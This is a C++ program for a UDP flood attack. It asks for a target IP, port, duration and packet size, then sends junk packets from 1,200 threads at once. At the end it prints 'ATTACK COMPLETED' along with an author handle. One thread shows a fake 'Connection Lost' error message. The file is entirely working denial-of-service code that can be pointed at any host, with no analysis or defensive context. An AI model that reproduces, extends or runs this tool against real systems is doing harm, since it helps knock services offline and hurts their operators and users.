#include <iostream>
#include <iomanip>      // For std::fixed and std::setprecision
#include <thread>
#include <vector>
#include <mutex>
#include <chrono>
#include <sys/socket.h> // POSIX socket library
#include <arpa/inet.h>  // For inet_addr
#include <unistd.h>     // For close
#include <string>
#include <cstring>      // For strncpy

#define NUM_THREADS 1200        // Number of threads for sending
#define MAX_PACKET_SIZE 65507   // Max UDP packet size (theoretical limit)
#define FAKE_ERROR_DELAY 677    // Delay in milliseconds for fake error
#define MIN_PACKET_SIZE 1       // Minimum packet size for practicality

// Shared variables for stats tracking
long long totalPacketsSent = 0;     // Total packets sent
long long totalPacketsReceived = 0; // Total packets received
double totalDataMB = 0.0;           // Total data sent in MB
std::mutex statsMutex;              // Mutex for thread-safe stats updates
std::mutex inputMutex;              // Mutex for safe input handling
bool keepSending = true;            // Flag to control sender threads
bool keepReceiving = true;          // Flag to control receiver thread
bool playerOkay = false;            // Flag for player response

// Sender function for each thread
void packetSender(int threadId, const std::string& targetIp, int targetPort, int durationSeconds, int packetSize) {
    int udpSocket;
    struct sockaddr_in serverAddr;
    char* packet = new char[packetSize]; // Dynamically allocate packet buffer
    std::memset(packet, 'A', packetSize); // Fill with dummy data (e.g., 'A')
    packet[packetSize - 1] = '\0'; // Null-terminate for safety

    // Create UDP socket
    udpSocket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (udpSocket < 0) {
        std::cerr << "Thread " << threadId << ": Socket creation failed\n";
        delete[] packet;
        return;
    }

    // Set up target address
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = inet_addr(targetIp.c_str());
    serverAddr.sin_port = htons(targetPort);

    long long threadPackets = 0;  // Packets sent by this thread
    double threadDataMB = 0.0;   // Data sent by this thread in MB
    auto startTime = std::chrono::steady_clock::now();

    // Special case for thread 677 (Player 677)
    if (threadId == 677) {
        std::this_thread::sleep_for(std::chrono::milliseconds(FAKE_ERROR_DELAY));
        {
            std::lock_guard<std::mutex> lock(inputMutex); // Prevent input conflicts
            std::cout << "Player 677: Fake Message - Network Error: Connection Lost\n";
            std::cout << "Type 'okay' to exit, or anything else to continue: ";
            std::string response;
            std::getline(std::cin, response);
            if (response == "okay") {
                std::lock_guard<std::mutex> statsLock(statsMutex);
                playerOkay = true;
                keepSending = false; // Signal all threads to stop
            }
        }
    }

    // Send packets until time is up or stopped
    while (keepSending) {
        auto now = std::chrono::steady_clock::now();
        auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(now - startTime).count();
        if (elapsed >= durationSeconds) break;

        ssize_t bytesSent = sendto(udpSocket, packet, packetSize, 0, 
                                 (struct sockaddr*)&serverAddr, sizeof(serverAddr));
        if (bytesSent > 0) {
            threadPackets++;
            threadDataMB += bytesSent / (1024.0 * 1024.0); // Convert to MB
        }
    }

    // Update shared stats
    {
        std::lock_guard<std::mutex> lock(statsMutex);
        totalPacketsSent += threadPackets;
        totalDataMB += threadDataMB;
    }

    close(udpSocket);
    delete[] packet; // Free allocated memory
}

// Receiver function
void packetReceiver(int listenPort, int packetSize) {
    int udpSocket;
    struct sockaddr_in serverAddr, clientAddr;
    char* buffer = new char[packetSize]; // Match sender's packet size
    socklen_t clientLen = sizeof(clientAddr);

    // Create UDP socket
    udpSocket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (udpSocket < 0) {
        std::cerr << "Receiver: Socket creation failed\n";
        delete[] buffer;
        return;
    }

    // Set up server address
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = INADDR_ANY;
    serverAddr.sin_port = htons(listenPort);

    // Bind socket
    if (bind(udpSocket, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) < 0) {
        std::cerr << "Receiver: Bind failed\n";
        close(udpSocket);
        delete[] buffer;
        return;
    }

    std::cout << "Receiver listening on port " << listenPort << "...\n";

    // Receive packets
    while (keepReceiving) {
        ssize_t bytes = recvfrom(udpSocket, buffer, packetSize, 0, 
                               (struct sockaddr*)&clientAddr, &clientLen);
        if (bytes > 0) {
            std::lock_guard<std::mutex> lock(statsMutex);
            totalPacketsReceived++;
        }
    }

    close(udpSocket);
    delete[] buffer;
}

int main() {
    std::string targetIp;
    int targetPort;
    int durationSeconds;
    int packetSize;

    // Get user inputs
    std::cout << "Enter target IP (e.g., 127.0.0.1 for localhost): ";
    std::getline(std::cin, targetIp);
    std::cout << "Enter target port (e.g., 12345): ";
    std::cin >> targetPort;
    std::cout << "Enter duration in seconds (e.g., 10): ";
    std::cin >> durationSeconds;
    std::cout << "Enter packet size in bytes (" << MIN_PACKET_SIZE << " to " << MAX_PACKET_SIZE << "): ";
    std::cin >> packetSize;
    std::cin.ignore(); // Clear newline

    // Validate inputs
    if (targetIp.empty()) {
        std::cerr << "Invalid IP, using default 127.0.0.1\n";
        targetIp = "127.0.0.1";
    }
    if (durationSeconds <= 0) {
        std::cerr << "Invalid duration, using default 10 seconds\n";
        durationSeconds = 10;
    }
    if (packetSize < MIN_PACKET_SIZE || packetSize > MAX_PACKET_SIZE) {
        std::cerr << "Invalid packet size, using default 1000 bytes\n";
        packetSize = 1000;
    }

    // Start receiver thread
    std::thread receiverThread(packetReceiver, targetPort, packetSize);

    // Launch sender threads
    std::vector<std::thread> senderThreads;
    for (int i = 0; i < NUM_THREADS; ++i) {
        senderThreads.emplace_back(packetSender, i, targetIp, targetPort, durationSeconds, packetSize);
    }

    std::cout << "Sending packets to " << targetIp << ":" << targetPort 
              << " for " << durationSeconds << " seconds with " << NUM_THREADS 
              << " threads and packet size " << packetSize << " bytes...\n";

    // Wait for sender threads to finish (either by duration or player response)
    for (auto& t : senderThreads) {
        t.join();
    }

    // Stop receiver after a short delay to catch remaining packets
    std::this_thread::sleep_for(std::chrono::seconds(1));
    keepReceiving = false;
    receiverThread.join();

    // Display final stats
    std::cout << "ATTACK COMPLETED.\n";
    std::cout << "║\n";
    std::cout << "║ TOTAL PACKETS SENT: " << totalPacketsSent << " ║\n";
    std::cout << "║ TOTAL DATA SENT: " << std::fixed << std::setprecision(2) << totalDataMB << " MB ║\n";
    std::cout << "║ TOTAL PACKETS RECEIVED: " << totalPacketsReceived << " ║\n";
    std::cout << "║ ATTACK FINISHED BY @Rohan2349 ║\n";
    std::cout << "║\n";

    return 0;
}